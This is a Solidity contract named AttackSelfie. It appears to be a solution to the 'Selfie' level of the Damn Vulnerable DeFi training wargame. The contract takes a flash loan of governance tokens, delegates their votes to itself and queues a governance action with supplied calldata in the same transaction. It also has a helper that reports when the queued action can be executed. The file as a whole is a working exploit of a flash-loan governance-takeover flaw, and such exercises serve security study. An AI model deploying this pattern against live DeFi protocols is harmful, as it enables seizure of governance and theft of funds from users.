// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";

contract AttackSelfie is IERC3156FlashBorrower {
    SimpleGovernance private _governance;
    uint256 public actionId;

    constructor(address governance) {
        _governance = SimpleGovernance(governance);
    }

    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata data)
        external
        returns (bytes32)
    {
        DamnValuableVotes(token).approve(msg.sender, amount);
        DamnValuableVotes(token).delegate(address(this));
        actionId = _governance.queueAction(msg.sender, 0, data);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function waitExecute() public view returns (uint256) {
        uint256 attackTime = _governance.getAction(actionId).proposedAt + _governance.getActionDelay();
        return block.timestamp > attackTime ? 0 : attackTime - block.timestamp;
    }
}
